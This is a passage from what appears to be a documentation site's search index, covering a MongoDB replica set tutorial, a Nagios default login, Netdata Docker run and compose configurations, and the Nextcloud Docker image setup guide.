documentation.</p> <p>If the command was successfully executed, you should see a message from the <code>mongosh</code> CLI indicating the version numbers of MongoDB and Mongosh, followed by a message indicating:</p> <pre><code>{ ok: 1 }\n</code></pre>"},{"location":"MongoDB/mongoDBinstruction/#test-and-verify-the-replica-set","title":"Test and Verify the Replica Set","text":"<p>You should now have a running replica set. If you want to verify that everything was configured correctly, you can use the <code>mongosh</code> CLI tool to evaluate the <code>rs.status()</code> instruction. This will provide you with the status of your replica set, including the list of members.</p> <pre><code>docker exec -it mongo1 mongosh --eval \"rs.status()\"\n</code></pre> <p>You can also connect to your cluster using MongoDB Compass to create a database and add some documents. Note that the data is created inside the container storage and will be destroyed when the containers are removed from the host system. To verify that your replica set is working, you can try stopping one of the containers with docker stop and try to read from your database again.</p> <pre><code>docker stop mongo1\n</code></pre> <p>The data will still be there. You can see that the cluster is still running by using <code>rs.status()</code> on the <code>mongo2</code> container.</p> <pre><code>docker exec -it mongo2 mongosh --eval \"rs.status()\"\n</code></pre> <p>You will still see the replica set, but notice that the first member is now down, and one of the other two members has been elected as the primary node. If you start your container <code>mongo1</code> again, you will be able to see it back in the replica set, but as a secondary member.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/","title":"Tutorial","text":"<p>https://blog.devgenius.io/how-to-deploy-a-mongodb-replicaset-using-docker-compose-a538100db471</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#how-to-deploy-a-mongodb-replica-set-using-docker-compose","title":"How to deploy a MongoDB replica set using docker-compose","text":"<p>Image by Tumisu, please consider \u2615 Thank you! \ud83e\udd17 from Pixabay</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#introduction","title":"Introduction","text":"<p>In this small MongoDB overview, we are going through some important MongoDB concepts related to replica sets. After some concept presentation, we will see some examples in action using docker-compose. We will use as the main source of information the official MongoDB documentation that can be found in the reference section. Without further due let\u2019s get started.</p> <p>This story is organized as follows:</p> <ul> <li>What is a replica set?</li> <li>Why should you need a replica set?</li> <li>Oplog</li> <li>How does replication work in MongoDB?</li> <li>What is an arbiter in MongoDB replica sets?</li> <li>Security</li> <li>Strategies for deploying your replica set</li> <li>Replication VS Sharding</li> <li>Getting practical</li> <li>BONUS</li> <li>Conclusion</li> </ul>"},{"location":"MongoDB/mongo-replica/Tutorial/#what-is-a-replica-set","title":"What is a replica set?","text":"<p>The concept of a replica set in mongo simply means that instead of having one process of mongo running you will have more than one. This way you can achieve higher availability of your data and redundancy, two important quality attributes when it comes to production-like environments. MongoDB at the time of this story allows up to 50 instances in a replica set.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#why-should-you-need-a-replica-set","title":"Why should you need a replica set?","text":"<p>Many scenarios might convince you to implement a replica set within your environment but here are some of them(not necessarily solved by the Proof of concept here shown):</p> <ul> <li>Depending on the configuration, assuring higher reads and writes speed(at some degree);</li> <li>Having databases \u201ccopies\u201d for different purposes(reads, writes, backup, reporting, disaster recovery \u2014 at this point a multiple region setup needs to be configured).</li> </ul> <p>In case you are now convinced about what it is and how could you benefit from it let\u2019s mention other interesting features!</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#oplog","title":"Oplog","text":"<p>While this term feels strange in this sequence of topics an introduction of what is Oplog plays an important role since the replication of MongoDB takes advantage of this concept, therefore essential in understanding the full picture of what replica sets are.</p> <p>Oplog stands for operations log, and it is a special collection within the replica set, its main goal is to register all the changes made in the different collections. Since this as you might suspect will be used by some nodes, there might be issues in the configuration of its size(to not create bottlenecks), so be sure to check and understand how to fine-tune it to your use case.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#how-does-replication-work-in-mongodb","title":"How does replication work in MongoDB?","text":"<p>As already mentioned a replica set has many nodes that together manage a data set. These nodes can keep mirroring the data with different strategies and have different preferences in the way they do it(preference in the replication, read nodes, backup nodes, etc\u2026). When a replica set is setup, one of the nodes becomes PRIMARY by default while others become SECONDARY. This is one of the concerns that our example has in mind. In our scenario, the most beneficial behaviour is to ensure that a defined node, always becomes PRIMARY. The main role of the PRIMARY node is to ensure that all writes will be processed by it. Now let\u2019s imagine you shutdown the PRIMARY node, what happens? In this case, an \u201celection\u201d takes place so that a SECONDARY becomes the new PRIMARY. The election can be triggered by a bunch of reasons but many of the times come down to the same cause, the heartbeat(like a ping endpoint). PRIMARY nodes keep telling other nodes that they are \u201calive\u201d when this doesn\u2019t happen(the configuration of the intervals for the heartbeat are configurable), the first secondary node that realizes this asks for an election.</p> <p>The role of the SECONDARY role is to asynchronously replicate the data that is in the PRIMARY node. Now we may wonder, how does the replication work? Well, replication takes place by sending oplog entries. Oplog holds all the changes in the database, this means that instead of just receiving the same \u201ccommands\u201d that the PRIMARY node receives, the SECONDARY nodes are fed with oplogs(they are specially designed for this) from the PRIMARY so that they replicate a similar state of their dataset.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#what-is-an-arbiter-in-mongodb-replica-sets","title":"What is an arbiter in MongoDB replica sets?","text":"<p>As simple as it gets now that we know what is an \u201celection\u201d, an arbiter is just a role that is only responsible to participate in elections. It does not help with the data redundancy quality attribute. So why should we want to have an arbiter then? One of the possible answers is, that you don\u2019t have enough votes or have an even number of votes. If you can\u2019t increase the number of secondary instances(imagine cost-wise or resource-wise), you can add one arbiter to do the trick.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#security","title":"Security","text":"<p>You can configure your replica set to use authorization, in this case, all the communication exchanged by the different instances will be encrypted. In some cases, you might also be required to configure security between your replica set members.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#strategies-for-deploying-your-replica-set","title":"Strategies for deploying your replica set","text":"<p>For production environments, the recommended approach by MongoDB documentation is 3 member replica set. While MongoDB recommends it is also advisable that you run the different scenarios that you have prepared for your system against your current strategy. If you want to deploy in different regions, this will affect your MongoDB strategy and you will probably want instead of 3 members, perhaps have a fourth that will be in a different region just backing up data. On the other hand, if you have high fault tolerance requirements having a minimum of 5 or 6 members can also be considered.</p> <p>The bottom line is that you will need to think about this thoroughly. The noticeable good thing is that changing configurations seems pretty straightforward so, considering you have the time to experiment you should be fine by making this an iterative process(while developing).</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#replication-vs-sharding","title":"Replication vs Sharding","text":"<p>This topic would make enough information to cover in a whole different story, but it is important to sometimes understand this concept which happens to be used together in the same context. Replication is achieved, as explained in this story, by configuring new nodes and providing a defined role to each one of them. Assuming this, let\u2019s think about the following scenario, what happens if you reach the limit of performance(writes and reads) on your PRIMARY node, what can be done to increase it? One of the options that you should consider is sharding, by sharding you will \u201csplit your node\u201d and you will make each \u201cshard\u201d take care of some operations. So instead of having a full data set per node, you will have a \u201cchunk\u201d of it. This is much more performant in many cases.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#getting-practical","title":"Getting practical","text":"<p>We will use this section to present the different files needed to run a simple example, be sure to follow the instructions and pay special attention to where the different files should be put for docker-compose mounts them properly.</p> <p>To achieve a simple 3 PSS node architecture(Primary-Secondary-Secondary) you can use a docker-compose as follows:</p> <p>Basically with this configuration, we will make sure that the mongo1 will always be our primary node, for all the nodes to communicate with each other we used a network, called \u201cmongo-network\u201d. We especially load all scripts in its directories.</p> <p>As mentioned throughout this story for you to get always the same primary you will need to choose the instances to have higher priority, this can be achieved using a field with the same name \u201cpriority\u201d, to apply these changes we are going to use a script that will be mounted in the mongo1 container(all these scripts should be put inside a new folder called \u201cscripts\u201d):</p> <p>After looking at the scripts you can notice that there are some delays declared, this is used to give time for the containers to start and, most importantly, later to let the election occur so that we have our mongo1 ready to start receiving connections as the PRIMARY node.</p> <p>Next and to get the mongo ready to accept your inserts and creation of new users and databases we use a small javascript file that can be expanded to suit your needs(also to be added inside the \u201cscripts\u201d folder):</p> <p>Finally and to trigger this example we can use a small bash script to glue everything together:</p> <p>This script does a little bit more than just running the docker-compose file, it also starts by cleaning your docker environment and ends by executing the script that we previously mounted into the mongo1.</p> <p>Note: Following some discussion in the comments, be aware that executing line 6 and line 7 will clean your docker environment, I personally used this script, to help me iterate over the different experiments I did, in case it doesn\u2019t suit your use-case feel free to remove/comment them.</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#bonus","title":"BONUS","text":"<p>Let us imagine that you instead of having a 3-node architecture, just want to have one node working as a replica set, this can be achieved in a simple docker-compose like this:</p>"},{"location":"MongoDB/mongo-replica/Tutorial/#conclusion","title":"Conclusion","text":"<p>In this story, a quick overview of some important concepts of MongoDB was presented, and some ideas about how to choose an architecture and what factors to consider. In the final part, two practical examples show what are replica sets and how to configure them. For more extensive information be sure to check the official MongoDB docs!</p> <p>Thanks for spending your precious time reading this story, I hope it helped you in some way. Any feedback you have be sure to use the comments below. If you liked this story clap and if you want to keep following my stories feel free to follow as well.</p>"},{"location":"Nagios/nagios/","title":"Nagios","text":"<p>Ver en \"localhost:8080\"</p> <p>Usuario: nagiosadmin</p> <p>Password: nagios</p>"},{"location":"Netdata%28Monitor%29/docker-compose/","title":"Docker compose","text":"<pre><code>version: '3.3'\nservices:\n    netdata:\n        container_name: netdata\n        ports:\n            - '19999:19999'\n        volumes:\n            - 'netdataconfig:/etc/netdata'\n            - 'netdatalib:/var/lib/netdata'\n            - 'netdatacache:/var/cache/netdata'\n            - '/etc/passwd:/host/etc/passwd:ro'\n            - '/etc/group:/host/etc/group:ro'\n            - '/proc:/host/proc:ro'\n            - '/sys:/host/sys:ro'\n            - '/etc/os-release:/host/etc/os-release:ro'\n        restart: unless-stopped\n        image: netdata/netdata\nvolumes:\n    netdataconfig:\n    netdatalib:\n    netdatacache:\n</code></pre> <pre><code>version: '3.3'\nservices:\n    netdata:\n        container_name: netdata\n        ports:\n            - '19999:19999'\n        volumes:\n            - 'netdataconfig:/etc/netdata'\n            - 'netdatalib:/var/lib/netdata'\n            - 'netdatacache:/var/cache/netdata'\n            - '/etc/passwd:/host/etc/passwd:ro'\n            - '/etc/group:/host/etc/group:ro'\n            - '/proc:/host/proc:ro'\n            - '/sys:/host/sys:ro'\n            - '/etc/os-release:/host/etc/os-release:ro'\n        restart: unless-stopped\n        image: netdata/netdata\nvolumes:\n  netdataconfig:\n  netdatalib:\n  netdatacache:\n</code></pre> <pre><code>docker run -d --name=netdata \\\n  --pid=host \\\n  --network=host \\\n  -v netdataconfig:/etc/netdata \\\n  -v netdatalib:/var/lib/netdata \\\n  -v netdatacache:/var/cache/netdata \\\n  -v /etc/passwd:/host/etc/passwd:ro \\\n  -v /etc/group:/host/etc/group:ro \\\n  -v /etc/localtime:/etc/localtime:ro \\\n  -v /proc:/host/proc:ro \\\n  -v /sys:/host/sys:ro \\\n  -v /etc/os-release:/host/etc/os-release:ro \\\n  -v /var/log:/host/var/log:ro \\\n  -v /var/run/docker.sock:/var/run/docker.sock:ro \\\n  --restart unless-stopped \\\n  --cap-add SYS_PTRACE \\\n  --cap-add SYS_ADMIN \\\n  --security-opt apparmor=unconfined \\\n  netdata/netdata\n</code></pre> <pre><code>docker run -d --name=netdata \\\n  -p 19999:19999 \\\n  -v /etc/passwd:/host/etc/passwd:ro \\\n  -v /etc/group:/host/etc/group:ro \\\n  -v /proc:/host/proc:ro \\\n  -v /sys:/host/sys:ro \\\n  -v /var/run/docker.sock:/var/run/docker.sock:ro \\\n  --cap-add SYS_PTRACE \\\n  --security-opt apparmor=unconfined \\\n  netdata/netdata\n</code></pre>"},{"location":"Nextcloud/NextCloud/","title":"What is Nextcloud?","text":"<p>A safe home for all your data. Access &amp; share your files, calendars, contacts, mail &amp; more from any device, on your terms.</p> <p></p> <p>This Docker micro-service image is developed and maintained by the Nextcloud community. Nextcloud GmbH does not offer support for this Docker image. When you are looking to get professional support, you can become an enterprise customer or use AIO.</p>"},{"location":"Nextcloud/NextCloud/#how-to-use-this-image","title":"How to use this image","text":"<p>This image is designed to be used in a micro-service environment. There are two versions of the image you can choose from.</p> <p>The <code>apache</code> tag contains a full Nextcloud installation including an apache web server. It is designed to be easy to use and gets you running pretty fast. This is also the default for the <code>latest</code> tag and version tags that are not further specified.</p> <p>The second option is a <code>fpm</code> container. It is based on the php-fpm image and runs a fastCGI-Process that serves your Nextcloud page. To use this image it must be combined with any webserver that can proxy the http requests to the FastCGI-port of the container.</p> <p></p>"},{"location":"Nextcloud/NextCloud/#using-the-apache-image","title":"Using the apache image","text":"<p>The apache image contains a webserver and exposes port 80. To start the container type:</p> <pre><code>$ docker run -d -p 8080:80 nextcloud\n</code></pre> <p>Now you can access Nextcloud at http://localhost:8080/ from your host system.</p>"},{"location":"Nextcloud/NextCloud/#using-the-fpm-image","title":"Using the fpm image","text":"<p>To use the fpm image, you need an additional web server, such as nginx, that can proxy http-request to the fpm-port of the container. For fpm connection this container exposes port 9000. In most cases, you might want use another container or your host as proxy. If you use your host you can address your Nextcloud container directly on port 9000. If you use another container, make sure that you add them to the same docker network (via <code>docker run --network &lt;NAME&gt; ...</code> or a <code>docker-compose</code> file). In both cases you don't want to map the fpm port to your host.</p> <pre><code>$ docker run -d nextcloud:fpm\n</code></pre> <p>As the fastCGI-Process is not capable of serving static files (style sheets, images, ...), the webserver needs access to these files. This can be achieved with the <code>volumes-from</code> option. You can find more information in the docker-compose section.</p>"},{"location":"Nextcloud/NextCloud/#using-an-external-database","title":"Using an external database","text":"<p>By default, this container uses SQLite for data storage but the Nextcloud setup wizard (appears on first run) allows connecting to an existing MySQL/MariaDB or PostgreSQL database. You can also link a database container, e. g. <code>--link my-mysql:mysql</code>, and then use <code>mysql</code> as the database host on setup. More info is in the docker-compose section.</p>"},{"location":"Nextcloud/NextCloud/#persistent-data","title":"Persistent data","text":"<p>The Nextcloud installation and all data beyond what lives in the database (file uploads, etc.) are stored in the unnamed docker volume volume <code>/var/www/html</code>. The docker daemon will store that data within the docker directory <code>/var/lib/docker/volumes/...</code>. That means your data is saved even if the container crashes, is stopped or deleted.</p> <p>A named Docker volume or a mounted host directory should be used for upgrades and backups. To achieve this, you need one volume for your database container and one for Nextcloud.</p> <p>Nextcloud: - <code>/var/www/html/</code> folder where all Nextcloud data lives</p> <pre><code>$ docker run -d \\\n-v nextcloud:/var/www/html \\\nnextcloud\n</code></pre> <p>Database: - <code>/var/lib/mysql</code> MySQL / MariaDB Data - <code>/var/lib/postgresql/data</code> PostgreSQL Data</p> <pre><code>$ docker run -d \\\n-v db:/var/lib/mysql \\\nmariadb:10.6\n</code></pre> <p>If you want to get fine grained access to your individual files, you can mount additional volumes for data, config, your theme and custom apps. The <code>data</code>, <code>config</code> files are stored in respective subfolders inside <code>/var/www/html/</code>. The apps are split into core <code>apps</code> (which are shipped with Nextcloud and you don't need to take care of) and a <code>custom_apps</code> folder. If you use a custom theme it would go into the <code>themes</code> subfolder.</p> <p>Overview of the folders that can be mounted as volumes:</p> <ul> <li><code>/var/www/html</code> Main folder, needed for updating</li> <li><code>/var/www/html/custom_apps</code> installed / modified apps</li> <li><code>/var/www/html/config</code> local configuration</li> <li><code>/var/www/html/data</code> the actual data of your Nextcloud</li> <li><code>/var/www/html/themes/&lt;YOUR_CUSTOM_THEME&gt;</code> theming/branding</li> </ul> <p>If you want to use named volumes for all of these, it would look like this:</p> <pre><code>$ docker run -d \\\n-v nextcloud:/var/www/html \\\n-v apps:/var/www/html/custom_apps \\\n-v config:/var/www/html/config \\\n-v data:/var/www/html/data \\\n-v theme:/var/www/html/themes/&lt;YOUR_CUSTOM_THEME&gt; \\\nnextcloud\n</code></pre> <p>If mounting additional volumes, you should note that data inside the main folder (<code>/var/www/html</code>) may be removed during installation and upgrades, unless listed in upgrade.exclude. You should consider: - Confirming that upgrade.exclude contains the files and folders that should persist during installation and upgrades; or  - Mounting storage volumes to locations outside of <code>/var/www/html</code>.</p>"},{"location":"Nextcloud/NextCloud/#using-the-nextcloud-command-line-interface","title":"Using the Nextcloud command-line interface","text":"<p>To use the Nextcloud command-line interface (aka. <code>occ</code> command):</p> <pre><code>$ docker exec --user www-data CONTAINER_ID php occ\n</code></pre> <p>or for docker-compose:</p> <pre><code>$ docker-compose exec --user www-data app php occ\n</code></pre>"},{"location":"Nextcloud/NextCloud/#auto-configuration-via-environment-variables","title":"Auto configuration via environment variables","text":"<p>The Nextcloud image supports auto configuration via environment variables. You can preconfigure everything that is asked on the install page on first run. To enable auto configuration, set your database connection via the following environment variables. You must specify all of the environment variables for a given database or the database environment variables defaults to SQLITE. ONLY use one database type!</p> <p>SQLite: - <code>SQLITE_DATABASE</code> Name of the database using sqlite</p> <p>MYSQL/MariaDB: - <code>MYSQL_DATABASE</code> Name of the database using mysql / mariadb. - <code>MYSQL_USER</code> Username for the database using mysql / mariadb. - <code>MYSQL_PASSWORD</code> Password for the database user using mysql / mariadb. - <code>MYSQL_HOST</code> Hostname of the database server using mysql / mariadb.</p> <p>PostgreSQL: - <code>POSTGRES_DB</code> Name of the database using postgres. - <code>POSTGRES_USER</code> Username for the database using postgres. - <code>POSTGRES_PASSWORD</code> Password for the database user using postgres. - <code>POSTGRES_HOST</code> Hostname of the database server using postgres.</p> <p>As an alternative to passing sensitive information via environment variables, <code>_FILE</code> may be appended to the previously listed environment variables, causing the initialization script to load the values for those variables from files present in the container. See Docker secrets section below.</p> <p>If you set any group of values (i.e. all of <code>MYSQL_DATABASE</code>, <code>MYSQL_USER</code>, <code>MYSQL_PASSWORD</code>, <code>MYSQL_HOST</code>), they will not be asked in the install page on first run. With a complete configuration by using all variables for your database type, you can additionally configure your Nextcloud instance by setting admin user and password (only works if you set both):</p> <ul> <li><code>NEXTCLOUD_ADMIN_USER</code> Name of the Nextcloud admin user.</li> <li><code>NEXTCLOUD_ADMIN_PASSWORD</code> Password for the Nextcloud admin user.</li> </ul> <p>If you want, you can set the data directory, otherwise default value will be used.</p> <ul> <li><code>NEXTCLOUD_DATA_DIR</code> (default: <code>/var/www/html/data</code>) Configures the data directory where nextcloud stores all files from the users.</li> </ul> <p>One or more trusted domains can be set through environment variable, too. They will be added to the configuration after install.</p> <ul> <li><code>NEXTCLOUD_TRUSTED_DOMAINS</code> (not set by default) Optional space-separated list of domains</li> </ul> <p>The install and update script is only triggered when a default command is used (<code>apache-foreground</code> or <code>php-fpm</code>). If you use a custom command you have to enable the install / update with</p> <ul> <li><code>NEXTCLOUD_UPDATE</code> (default: <code>0</code>)</li> </ul> <p>You might want to make sure the htaccess is up to date after each container update. Especially on multiple swarm nodes as any discrepancy will make your server unusable.</p> <ul> <li><code>NEXTCLOUD_INIT_HTACCESS</code> (not set by default) Set it to true to enable run <code>occ maintenance:update:htaccess</code> after container initialization.</li> </ul> <p>If you want to use Redis you have to create a separate Redis container in your setup / in your docker-compose file. To inform Nextcloud about the Redis container, pass in the following parameters:</p> <ul> <li><code>REDIS_HOST</code> (not set by default) Name of Redis container</li> <li><code>REDIS_HOST_PORT</code> (default: <code>6379</code>) Optional port for Redis, only use for external Redis servers that run on non-standard ports.</li> <li><code>REDIS_HOST_PASSWORD</code> (not set by default) Redis password</li> </ul> <p>The use of Redis is recommended to prevent file locking problems. See the examples for further instructions.</p> <p>To use an external SMTP server, you have to provide the connection details. To configure Nextcloud to use SMTP add:</p> <ul> <li><code>SMTP_HOST</code> (not set by default): The hostname of the SMTP server.</li> <li><code>SMTP_SECURE</code> (empty by default): Set to <code>ssl</code> to use SSL, or <code>tls</code> to use STARTTLS.</li> <li><code>SMTP_PORT</code> (default: <code>465</code> for SSL and <code>25</code> for non-secure connections): Optional port for the SMTP connection. Use <code>587</code> for an alternative port for STARTTLS.</li> <li><code>SMTP_AUTHTYPE</code> (default: <code>LOGIN</code>): The method used for authentication. Use <code>PLAIN</code> if no authentication is required.</li> <li><code>SMTP_NAME</code> (empty by default): The username for the authentication.</li> <li><code>SMTP_PASSWORD</code> (empty by default): The password for the authentication.</li> <li><code>MAIL_FROM_ADDRESS</code> (not set by default): Set the local-part for the 'from' field in the emails sent by Nextcloud.</li> <li><code>MAIL_DOMAIN</code> (not set by default): Set a different domain for the emails than the domain where Nextcloud is installed.</li> </ul> <p>Check the Nextcloud documentation for other values to configure SMTP.</p> <p>To use an external S3 compatible object store as primary storage, set the following variables: - <code>OBJECTSTORE_S3_HOST</code>: The hostname of the object storage server - <code>OBJECTSTORE_S3_BUCKET</code>: The name of the bucket that Nextcloud should store the data in - <code>OBJECTSTORE_S3_KEY</code>: AWS style access key - <code>OBJECTSTORE_S3_SECRET</code>: AWS style secret access key - <code>OBJECTSTORE_S3_PORT</code>: The port that the object storage server is being served over - <code>OBJECTSTORE_S3_SSL</code> (default: <code>true</code>): Whether or not SSL/TLS should be used to communicate with object storage server - <code>OBJECTSTORE_S3_REGION</code>: The region that the S3 bucket resides in. - <code>OBJECTSTORE_S3_USEPATH_STYLE</code> (default: <code>false</code>): Not required for AWS S3 - <code>OBJECTSTORE_S3_LEGACYAUTH</code> (default: <code>false</code>): Not required for AWS S3 - <code>OBJECTSTORE_S3_OBJECT_PREFIX</code> (default: <code>urn:oid:</code>): Prefix to prepend to the fileid - <code>OBJECTSTORE_S3_AUTOCREATE</code> (default: <code>true</code>): Create the container if it does not exist</p> <p>Check the Nextcloud documentation for more information.</p> <p>To use an external OpenStack Swift object store as primary storage, set the following variables: - <code>OBJECTSTORE_SWIFT_URL</code>: The Swift identity (Keystone) endpoint - <code>OBJECTSTORE_SWIFT_AUTOCREATE</code> (default: <code>false</code>): Whether or not Nextcloud should automatically create the Swift container - <code>OBJECTSTORE_SWIFT_USER_NAME</code>: Swift username - <code>OBJECTSTORE_SWIFT_USER_PASSWORD</code>: Swift user password - <code>OBJECTSTORE_SWIFT_USER_DOMAIN</code> (default: <code>Default</code>): Swift user domain - <code>OBJECTSTORE_SWIFT_PROJECT_NAME</code>: OpenStack project name - <code>OBJECTSTORE_SWIFT_PROJECT_DOMAIN</code> (default: <code>Default</code>): OpenStack project domain - <code>OBJECTSTORE_SWIFT_SERVICE_NAME</code> (default: <code>swift</code>): Swift service name - <code>OBJECTSTORE_SWIFT_REGION</code>: Swift endpoint region - <code>OBJECTSTORE_SWIFT_CONTAINER_NAME</code>: Swift container (bucket) that Nextcloud should store the data in</p> <p>Check the Nextcloud documentation for more information.</p> <p>To customize other PHP limits you can simply change the following variables: - <code>PHP_MEMORY_LIMIT</code> (default <code>512M</code>) This sets the maximum amount of memory in bytes that a script is allowed to allocate. This is meant to help prevent poorly written scripts from eating up all available memory but it can prevent normal operation if set too tight. - <code>PHP_UPLOAD_LIMIT</code> (default <code>512M</code>) This sets the upload limit (<code>post_max_size</code> and <code>upload_max_filesize</code>) for big files. Note that you may have to change other limits depending on your client, webserver or operating system. Check the Nextcloud documentation for more information.</p>"},{"location":"Nextcloud/NextCloud/#using-the-apache-image-behind-a-reverse-proxy-and-auto-configure-server-host-and-protocol","title":"Using the apache image behind a reverse proxy and auto configure server host and protocol","text":"<p>The apache image will replace the remote addr (IP address visible to Nextcloud) with the IP address from <code>X-Real-IP</code> if the request is coming from a proxy in <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code> or <code>192.168.0.0/16</code> by default. If you want Nextcloud to pick up the server host (<code>HTTP_X_FORWARDED_HOST</code>), protocol (<code>HTTP_X_FORWARDED_PROTO</code>) and client IP (<code>HTTP_X_FORWARDED_FOR</code>) from a trusted proxy, then disable rewrite IP and add the reverse proxy's IP address to <code>TRUSTED_PROXIES</code>.</p> <ul> <li> <p><code>APACHE_DISABLE_REWRITE_IP</code> (not set by default): Set to 1 to disable rewrite IP.</p> </li> <li> <p><code>TRUSTED_PROXIES</code> (empty by default): A space-separated list of trusted proxies. CIDR notation is supported for IPv4.</p> </li> </ul> <p>If the <code>TRUSTED_PROXIES</code> approach does not work for you, try using fixed values for overwrite parameters.</p> <ul> <li><code>OVERWRITEHOST</code> (empty by default): Set the hostname of the proxy. Can also specify a port.</li> <li><code>OVERWRITEPROTOCOL</code> (empty by default): Set the protocol of the proxy, http or https.</li> <li><code>OVERWRITECLIURL</code> (empty by default): Set the cli url of the proxy (e.g. https://mydnsname.example.com)</li> <li><code>OVERWRITEWEBROOT</code> (empty by default): Set the absolute path of the proxy.</li> <li><code>OVERWRITECONDADDR</code> (empty by default): Regex to overwrite the values dependent on the remote address.</li> </ul> <p>Check the Nexcloud documentation for more details.</p> <p>Keep in mind that once set, removing these environment variables won't remove these values from the configuration file, due to how Nextcloud merges configuration files together.</p>"},{"location":"Nextcloud/NextCloud/#running-this-image-with-docker-compose","title":"Running this image with docker-compose","text":"<p>The easiest way to get a fully featured and functional setup is using a <code>docker-compose</code> file. There are too many different possibilities to setup your system, so here are only some examples of what you have to look for.</p> <p>At first, make sure you have chosen the right base image (fpm or apache) and added features you wanted (see below). In every case, you would want to add a database container and docker volumes to get easy access to your persistent data. When you want to have your server reachable from the internet, adding HTTPS-encryption is mandatory! See below for more information.</p>"},{"location":"Nextcloud/NextCloud/#base-version-apache","title":"Base version - apache","text":"<p>This version will use the apache image and add a mariaDB container. The volumes are set to keep your data persistent. This setup provides no ssl encryption and is intended to run behind a proxy.</p> <p>Make sure to pass in values for <code>MYSQL_ROOT_PASSWORD</code> and <code>MYSQL_PASSWORD</code> variables before you run this setup.</p> <pre><code>version: '2'\n\nvolumes:\n  nextcloud:\n  db:\n\nservices:\n  db:\n    image: mariadb:10.6\n    restart: always\n    command: --transaction-isolation=READ-COMMITTED --log-bin=binlog --binlog-format=ROW\n    volumes:\n      - db:/var/lib/mysql\n    environment:\n      - MYSQL_ROOT_PASSWORD=\n      - MYSQL_PASSWORD=\n      - MYSQL_DATABASE=nextcloud\n      - MYSQL_USER=nextcloud\n\n  app:\n    image: nextcloud\n    restart: always\n    ports:\n      - 8080:80\n    links:\n      - db\n    volumes:\n      - nextcloud:/var/www/html\n    environment:\n      - MYSQL_PASSWORD=\n      - MYSQL_DATABASE=nextcloud\n      - MYSQL_USER=nextcloud\n      - MYSQL_HOST=db\n</code></pre> <p>Then run <code>docker-compose up -d</code>, now you can access Nextcloud at http://localhost:8080/ from your host system.</p>"},{"location":"Nextcloud/NextCloud/#base-version-fpm","title":"Base version - FPM","text":"<p>When using the FPM image, you need another container that acts as web server on port 80 and proxies the requests to the Nextcloud container. In this example a simple nginx container is combined with the Nextcloud-fpm image and a MariaDB database container. The data is stored in docker volumes. The nginx container also needs access to static files from your Nextcloud installation. It gets access to all the volumes mounted to Nextcloud via the <code>volumes_from</code> option.The configuration for nginx is stored in the configuration file <code>nginx.conf</code>, that is mounted into the container. An example can be found in the examples section here.</p> <p>As this setup does not include encryption, it should be run behind a proxy.</p> <p>Make sure to pass in values for <code>MYSQL_ROOT_PASSWORD</code> and <code>MYSQL_PASSWORD</code> variables before you run this setup.</p> <pre><code>version: '2'\n\nvolumes:\n  nextcloud:\n  db:\n\nservices:\n  db:\n    image: mariadb:10.6\n    restart: always\n    command: --transaction-isolation=READ-COMMITTED --log-bin=binlog --binlog-format=ROW\n    volumes:\n      - db:/var/lib/mysql\n    environment:\n      - MYSQL_ROOT_PASSWORD=\n      - MYSQL_PASSWORD=\n      - MYSQL_DATABASE=nextcloud\n      - MYSQL_USER=nextcloud\n\n  app:\n    image: nextcloud:fpm\n    restart: always\n    links:\n      - db\n    volumes:\n      - nextcloud:/var/www/html\n    environment:\n      - MYSQL_PASSWORD=\n      - MYSQL_DATABASE=nextcloud\n      - MYSQL_USER=nextcloud\n      - MYSQL_HOST=db\n\n  web:\n    image: nginx\n    restart: always\n    ports:\n      - 8080:80\n    links:\n      - app\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n    volumes_from:\n      - app\n</code></pre> <p>Then run <code>docker-compose up -d</code>, now you can access Nextcloud at http://localhost:8080/ from your host system.</p>"},{"location":"Nextcloud/NextCloud/#docker-secrets","title":"Docker Secrets","text":"<p>As an alternative to passing sensitive information via environment variables, <code>_FILE</code> may be appended to the previously listed environment variables, causing the initialization script to load the values for those variables from files present in the container. In particular, this can be used to load passwords from Docker secrets stored in <code>/run/secrets/&lt;secret_name&gt;</code> files. For example:</p> <pre><code>version: '3.2'\n\nservices:\n  db:\n    image: postgres\n    restart: always\n    volumes:\n      - db:/var/lib/postgresql/data\n    environment:\n      - POSTGRES_DB_FILE=/run/secrets/postgres_db\n      - POSTGRES_USER_FILE=/run/secrets/postgres_user\n      - POSTGRES_PASSWORD_FILE=/run/secrets/postgres_password\n    secrets:\n      - postgres_db\n      - postgres_password\n      - postgres_user\n\n  app:\n    image: nextcloud\n    restart: always\n    ports:\n      - 8080:80\n    volumes:\n      - nextcloud:/var/www/html\n    environment:\n      - POSTGRES_HOST=db\n      - POSTGRES_DB_FILE=/run/secrets/postgres_db\n      - POSTGRES_USER_FILE=/run/secrets/postgres_user\n      - POSTGRES_PASSWORD_FILE=/run/secrets/postgres_password\n      - NEXTCLOUD_ADMIN_PASSWORD_FILE=/run/secrets/nextcloud_admin_password\n      - NEXTCLOUD_ADMIN_USER_FILE=/run/secrets/nextcloud_admin_user\n    depends_on:\n      - db\n    secrets:\n      - nextcloud_admin_password\n      - nextcloud_admin_user\n      - postgres_db\n      - postgres_password\n      - postgres_user\n\nvolumes:\n  db:\n  nextcloud:\n\nsecrets:\n  nextcloud_admin_password:\n    file: ./nextcloud_admin_password.txt # put admin password in this file\n  nextcloud_admin_user:\n    file: ./nextcloud_admin_user.txt # put admin username in this file\n  postgres_db:\n    file: ./postgres_db.txt # put postgresql db name in this file\n  postgres_password:\n    file: ./postgres_password.txt # put postgresql password in this file\n  postgres_user:\n    file: ./postgres_user.txt # put postgresql username in this file\n</code></pre> <p>Currently, this is only supported for <code>NEXTCLOUD_ADMIN_PASSWORD</code>, <code>NEXTCLOUD_ADMIN_USER</code>, <code>MYSQL_DATABASE</code>, <code>MYSQL_PASSWORD</code>, <code>MYSQL_USER</code>, <code>POSTGRES_DB</code>, <code>POSTGRES_PASSWORD</code>, <code>POSTGRES_USER</code>, 